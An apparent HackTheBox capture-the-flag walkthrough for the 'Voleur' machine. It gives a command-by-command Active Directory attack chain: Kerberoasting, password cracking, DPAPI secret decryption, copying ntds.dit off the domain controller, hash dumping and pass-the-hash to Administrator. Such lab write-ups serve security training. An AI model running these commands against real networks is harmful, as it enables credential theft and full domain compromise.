# HackTheBox: Voleur Walkthrough

This is a complete step-by-step guide for rooting the **"Voleur"** machine on HackTheBox, referencing the detailed writeup on insidepwn.com. All commands are updated, concise, and demonstrate the reasons behind each action.

---

## 1. Initial Enumeration

Nmap scan reveals SSH service on port 2222:

```bash
nmap -A voleur.htb -p-
```

Only unusual open port is SSH (2222).

---

## 2. Kerberos/SMB Enumeration (Foothold)

We are given credentials:

- **Username**: `ryan.naylor`
- **Password**: `HollowOct31Nyt`

Since NTLM is disabled, use Kerberos:

```bash
impacket-getTGT 'VOLEUR.HTB/ryan.naylor':'HollowOct31Nyt'
export KRB5CCNAME=ryan.naylor.ccache
impacket-smbclient -k -no-pass VOLEUR.HTB/ryan.naylor@dc.voleur.htb
```

Explore the `IT` share → `First-Line Support/` → `Access_Review.xlsx` (password-protected).

---

## 3. Cracking Excel Password

```bash
office2john Access_Review.xlsx > hash.txt
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

Open the Excel file after cracking to reveal more credentials.

---

## 4. BloodHound / Privilege Discovery

Excel shows `svc_ldap` has `writespn` over `svc_winrm`. Use these creds:

```bash
impacket-getTGT 'VOLEUR.HTB/svc_ldap:M1XyC9pW7qT5Vn'
export KRB5CCNAME=svc_ldap.ccache
python targetedKerberoast.py -k --dc-host dc.voleur.htb -d VOLEUR.HTB
```

Crack dumped Kerberoast hash:

```bash
john svc_winrm.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

---

## 5. Shell Access with WinRM

```bash
impacket-getTGT 'VOLEUR.HTB/svc_winrm:<password>'
export KRB5CCNAME=svc_winrm.ccache
evil-winrm -i dc.voleur.htb -r voleur.htb
```

---

## 6. Privilege Escalation — Restoring Deleted User

Restore `todd.wolfe` using `svc_ldap` credentials:

```bash
bloodyAD --host dc.voleur.htb -d voleur.htb -u 'svc_ldap' -p 'M1XyC9pW7qT5Vn' -k set restore 'todd.wolfe'
```

---

## 7. Dump DPAPI Credentials

Get TGT for todd.wolfe:

```bash
impacket-getTGT 'VOLEUR.HTB/todd.wolfe:<password>'
export KRB5CCNAME=todd.wolfe.ccache
impacket-smbclient -k -no-pass VOLEUR.HTB/todd.wolfe@dc.voleur.htb
```

Download:

- `772275FAD58525253490A9B0039791D3`
- `08949382-134f-4c63-b93c-ce52efc0aa88`

Decrypt using DPAPI:

```bash
impacket-dpapi masterkey -file 08949382-134f-4c63-b93c-ce52efc0aa88 -password '<todd_password>' -sid S-1-5-21-3927696377-1337352550-2781715495-1110
impacket-dpapi credential -file 772275FAD58525253490A9B0039791D3 -key <masterkey>
```

This reveals **jeremy.combs' password**.

---

## 8. SSH as svc_backup via id_rsa

From Jeremy's SMB share, download `id_rsa` and login note.

SSH into box:

```bash
ssh -i id_rsa svc_backup@voleur.htb -p 2222
```

---

## 9. Dumping AD Hashes

Navigate and copy:

```bash
cd /mnt/c/IT/Third-Line Support/Backups/Active Directory/
cp ntds.dit /tmp

cd /mnt/c/IT/Third-Line Support/Backups/registry/
cp SYSTEM /tmp
```

Transfer to attacker box:

```bash
scp -i id_rsa -P 2222 svc_backup@voleur.htb:/tmp/ntds.dit .
scp -i id_rsa -P 2222 svc_backup@voleur.htb:/tmp/SYSTEM .
```

Dump hashes:

```bash
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
```

---

## 10. Root Access

With dumped NTLM hash, get admin access:

```bash
impacket-getTGT 'VOLEUR.HTB/Administrator' -hashes <LM:NT>
export KRB5CCNAME=Administrator.ccache
evil-winrm -i dc.voleur.htb -r voleur.htb
```

Read `root.txt` from Administrator's Desktop.

---

## ✅ Key Takeaways

- Focus on Kerberos-based auth when NTLM is disabled.
- Excel docs may reveal lateral movement or privilege paths.
- Use BloodHound/LDAP/AD tools for privilege discovery.
- DPAPI lets you extract chained secrets from users.
- Every share and backup may lead to root.

---
